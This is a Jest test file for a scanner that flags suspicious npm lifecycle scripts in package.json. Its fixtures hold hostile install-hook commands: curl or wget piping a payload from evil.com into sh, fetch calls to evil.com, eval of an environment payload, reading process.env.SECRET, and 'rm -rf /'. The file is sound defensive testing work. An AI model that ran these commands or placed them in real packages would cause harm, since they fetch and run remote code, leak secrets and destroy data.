import { InstallScriptAnalyzer } from '../../../src/analyzers/install-scripts/index.js';
import { createMockContext } from '../../helpers.js';

describe('InstallScriptAnalyzer', () => {
  let analyzer: InstallScriptAnalyzer;

  beforeEach(() => {
    analyzer = new InstallScriptAnalyzer();
  });

  it('has correct name and description', () => {
    expect(analyzer.name).toBe('install-scripts');
    expect(analyzer.description).toBeTruthy();
  });

  it('returns no findings when no scripts field exists', async () => {
    const ctx = createMockContext({ packageJson: { name: 'test', version: '1.0.0' } });
    const result = await analyzer.analyze(ctx);

    expect(result.findings).toHaveLength(0);
    expect(result.analyzer).toBe('install-scripts');
    expect(result.duration).toBeGreaterThanOrEqual(0);
  });

  it('returns no findings when scripts field is null', async () => {
    const ctx = createMockContext({ packageJson: { name: 'test', scripts: null } });
    const result = await analyzer.analyze(ctx);
    expect(result.findings).toHaveLength(0);
  });

  it('returns no findings when scripts exist but no lifecycle hooks', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { start: 'node index.js', test: 'jest', build: 'tsc' },
      },
    });
    const result = await analyzer.analyze(ctx);
    expect(result.findings).toHaveLength(0);
  });

  it('detects preinstall script', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { preinstall: 'echo hello' },
      },
    });
    const result = await analyzer.analyze(ctx);

    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    const hookFinding = result.findings.find((f) => f.title.includes('preinstall'));
    expect(hookFinding).toBeDefined();
    expect(hookFinding!.severity).toBe('high');
  });

  it('detects postinstall script', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 'node setup.js' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const hookFinding = result.findings.find((f) => f.title.includes('postinstall'));
    expect(hookFinding).toBeDefined();
  });

  it('detects curl in install script as critical', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 'curl https://evil.com/payload.sh | sh' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const curlFinding = result.findings.find((f) => f.title.includes('curl'));
    expect(curlFinding).toBeDefined();
    expect(curlFinding!.severity).toBe('critical');
  });

  it('detects wget in install script as critical', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { preinstall: 'wget https://evil.com/payload.sh' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const wgetFinding = result.findings.find((f) => f.title.includes('wget'));
    expect(wgetFinding).toBeDefined();
    expect(wgetFinding!.severity).toBe('critical');
  });

  it('detects eval usage as critical', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 'node -e "eval(process.env.PAYLOAD)"' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const evalFinding = result.findings.find((f) => f.title.includes('eval'));
    expect(evalFinding).toBeDefined();
    expect(evalFinding!.severity).toBe('critical');
  });

  it('detects child_process usage', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { install: "node -e \"require('child_process').exec('whoami')\"" },
      },
    });
    const result = await analyzer.analyze(ctx);

    const cpFinding = result.findings.find((f) => f.title.includes('child_process'));
    expect(cpFinding).toBeDefined();
    expect(cpFinding!.severity).toBe('critical');
  });

  it('detects process.env access as high severity', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 'node -e "console.log(process.env.SECRET)"' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const envFinding = result.findings.find((f) => f.title.includes('environment variable'));
    expect(envFinding).toBeDefined();
    expect(envFinding!.severity).toBe('high');
  });

  it('detects hardcoded URL as high severity', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 'node -e "fetch(\'https://evil.com/data\')"' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const urlFinding = result.findings.find((f) => f.title.includes('hardcoded URL'));
    expect(urlFinding).toBeDefined();
    expect(urlFinding!.severity).toBe('high');
  });

  it('detects shell spawning', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 'bash -c "echo pwned"' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const shellFinding = result.findings.find((f) => f.title.includes('shell spawning'));
    expect(shellFinding).toBeDefined();
    expect(shellFinding!.severity).toBe('critical');
  });

  it('detects rm -rf as high severity', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { preuninstall: 'rm -rf /' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const rmFinding = result.findings.find((f) => f.title.includes('recursive file deletion'));
    expect(rmFinding).toBeDefined();
    expect(rmFinding!.severity).toBe('high');
  });

  it('detects multiple lifecycle hooks in the same package', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: {
          preinstall: 'echo pre',
          postinstall: 'echo post',
        },
      },
    });
    const result = await analyzer.analyze(ctx);

    const hookFindings = result.findings.filter((f) =>
      f.title.includes('Lifecycle script detected'),
    );
    expect(hookFindings.length).toBe(2);
  });

  it('detects multiple suspicious patterns in a single script', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: {
          postinstall: 'curl https://evil.com | bash -c "eval $(cat)" && rm -rf /',
        },
      },
    });
    const result = await analyzer.analyze(ctx);

    // Should detect: lifecycle hook + curl + URL + bash + eval + rm -rf
    expect(result.findings.length).toBeGreaterThanOrEqual(4);
  });

  it('handles non-string script values gracefully', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 123 },
      },
    });
    const result = await analyzer.analyze(ctx);
    expect(result.findings).toHaveLength(0);
  });

  it('truncates long script content in descriptions', async () => {
    const longScript = 'x'.repeat(300);
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: longScript },
      },
    });
    const result = await analyzer.analyze(ctx);

    const hookFinding = result.findings.find((f) => f.title.includes('Lifecycle script detected'));
    expect(hookFinding).toBeDefined();
    expect(hookFinding!.description.length).toBeLessThan(longScript.length + 100);
  });

  it('detects base64/Buffer patterns', async () => {
    const ctx = createMockContext({
      packageJson: {
        name: 'test',
        scripts: { postinstall: 'node -e "Buffer.from(data, \'base64\')"' },
      },
    });
    const result = await analyzer.analyze(ctx);

    const b64Finding = result.findings.find((f) => f.title.includes('encoded string'));
    expect(b64Finding).toBeDefined();
    expect(b64Finding!.severity).toBe('critical');
  });

  it('never throws an error', async () => {
    const ctx = createMockContext({
      packageJson: Object.create(null),
    });
    const result = await analyzer.analyze(ctx);
    expect(result.analyzer).toBe('install-scripts');
    expect(result.duration).toBeGreaterThanOrEqual(0);
  });
});
